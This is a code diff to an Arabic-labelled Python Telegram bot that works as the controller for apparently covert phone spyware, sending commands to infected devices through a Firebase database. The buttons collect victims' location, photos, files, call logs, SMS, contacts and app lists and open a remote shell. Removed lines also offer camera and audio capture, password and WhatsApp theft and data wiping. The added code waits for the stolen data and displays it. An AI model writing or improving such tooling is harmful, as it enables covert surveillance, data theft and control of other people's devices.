@@ -1,8 +1,9 @@
 import os
 import time
+import asyncio
 import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "ضع_التوكن")
 FIREBASE_URL = os.environ.get("FIREBASE_URL", "https://devils-monitor-default-rtdb.firebaseio.com")
@@ -36,31 +37,23 @@ def devices_kb():
 
 def control_kb(did):
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("📊 معلومات", callback_data=f"cmd:{did}:get_system_info"),
-         InlineKeyboardButton("🔋 بطارية", callback_data=f"cmd:{did}:get_battery")],
-        [InlineKeyboardButton("📍 موقع", callback_data=f"cmd:{did}:get_location"),
-         InlineKeyboardButton("🖼️ صور", callback_data=f"cmd:{did}:get_gallery")],
-        [InlineKeyboardButton("📁 ملفات", callback_data=f"cmd:{did}:get_files"),
-         InlineKeyboardButton("📱 تطبيقات", callback_data=f"cmd:{did}:get_installed_apps")],
-        [InlineKeyboardButton("📞 مكالمات", callback_data=f"cmd:{did}:get_call_log"),
-         InlineKeyboardButton("💬 SMS", callback_data=f"cmd:{did}:get_sms_log")],
-        [InlineKeyboardButton("👥 جهات", callback_data=f"cmd:{did}:get_contacts"),
-         InlineKeyboardButton("🎯 Clipboard", callback_data=f"cmd:{did}:get_clipboard")],
-        [InlineKeyboardButton("🔦 فلاش ON", callback_data=f"cmd:{did}:torch_on"),
-         InlineKeyboardButton("🔦 فلاش OFF", callback_data=f"cmd:{did}:torch_off")],
-        [InlineKeyboardButton("📳 اهتزاز", callback_data=f"cmd:{did}:vibrate"),
-         InlineKeyboardButton("🔔 إشعار", callback_data=f"menu:{did}:notify")],
-        [InlineKeyboardButton("🔒 قفل", callback_data=f"cmd:{did}:lock"),
-         InlineKeyboardButton("🔊 صوت", callback_data=f"menu:{did}:speak")],
-        [InlineKeyboardButton("💬 رسالة", callback_data=f"menu:{did}:sms"),
+        [InlineKeyboardButton("📊 معلومات", callback_data=f"cmd:{did}:get_system_info:systemInfo"),
+         InlineKeyboardButton("🔋 بطارية", callback_data=f"cmd:{did}:get_battery:battery")],
+        [InlineKeyboardButton("📍 موقع", callback_data=f"cmd:{did}:get_location:location"),
+         InlineKeyboardButton("🖼️ صور", callback_data=f"cmd:{did}:get_gallery:gallery")],
+        [InlineKeyboardButton("📁 ملفات", callback_data=f"cmd:{did}:get_files:files"),
+         InlineKeyboardButton("📱 تطبيقات", callback_data=f"cmd:{did}:get_installed_apps:apps")],
+        [InlineKeyboardButton("📞 مكالمات", callback_data=f"cmd:{did}:get_call_log:calls"),
+         InlineKeyboardButton("💬 SMS", callback_data=f"cmd:{did}:get_sms_log:sms")],
+        [InlineKeyboardButton("👥 جهات", callback_data=f"cmd:{did}:get_contacts:contacts"),
+         InlineKeyboardButton("🔦 فلاش ON", callback_data=f"cmd:{did}:torch_on:")],
+        [InlineKeyboardButton("🔦 فلاش OFF", callback_data=f"cmd:{did}:torch_off:"),
+         InlineKeyboardButton("📳 اهتزاز", callback_data=f"cmd:{did}:vibrate:")],
+        [InlineKeyboardButton("🔔 إشعار", callback_data=f"menu:{did}:notify"),
+         InlineKeyboardButton("💬 رسالة", callback_data=f"menu:{did}:sms")],
+        [InlineKeyboardButton("🔊 صوت", callback_data=f"menu:{did}:speak"),
          InlineKeyboardButton("🖥️ Shell", callback_data=f"menu:{did}:shell")],
-        [InlineKeyboardButton("📸 كاميرا أمامية", callback_data=f"cmd:{did}:take_photo_front"),
-         InlineKeyboardButton("📸 خلفية", callback_data=f"cmd:{did}:take_photo_back")],
-        [InlineKeyboardButton("🎤 تسجيل صوت", callback_data=f"cmd:{did}:record_audio"),
-         InlineKeyboardButton("🖥️ تسجيل شاشة", callback_data=f"cmd:{did}:record_screen")],
-        [InlineKeyboardButton("💬 دردشات واتساب", callback_data=f"cmd:{did}:get_whatsapp"),
-         InlineKeyboardButton("🔑 كلمات", callback_data=f"cmd:{did}:get_passwords")],
-        [InlineKeyboardButton("🗑️ مسح البيانات", callback_data=f"cmd:{did}:wipe_data")],
+        [InlineKeyboardButton("🔒 قفل", callback_data=f"cmd:{did}:lock:")],
         [InlineKeyboardButton("◀️ رجوع", callback_data="refresh")],
     ])
 
@@ -90,9 +83,28 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     if data.startswith("cmd:"):
-        _, did, cmd = data.split(":", 2)
+        parts = data.split(":")
+        did = parts[1]
+        cmd = parts[2]
+        data_key = parts[3] if len(parts) > 3 else ""
+
         fb_push(f"commands/{did}", {"type": cmd, "timestamp": int(time.time()*1000)})
-        await q.answer("✅ تم الإرسال", show_alert=False)
+
+        if data_key:
+            await q.edit_message_text(f"⏳ تم إرسال الأمر، جاري الجلب...", 
+                                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ رجوع", callback_data=f"dev:{did}")]]))
+            for _ in range(15):
+                await asyncio.sleep(1)
+                result = fb_get(f"data/{did}/{data_key}")
+                if result:
+                    text = f"✅ {cmd}:\n```\n{str(result)[:3500]}\n```"
+                    await q.edit_message_text(text, parse_mode="Markdown",
+                                             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ رجوع", callback_data=f"dev:{did}")]]))
+                    return
+            await q.edit_message_text("⚠️ لم تصل بيانات.",
+                                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ رجوع", callback_data=f"dev:{did}")]]))
+        else:
+            await q.answer("✅ تم الإرسال", show_alert=False)
         return
 
     if data.startswith("menu:"):
@@ -139,7 +151,6 @@ def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button))
-    from telegram.ext import MessageHandler, filters
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
     print("🤖 البوت يعمل...")
     app.run_polling()
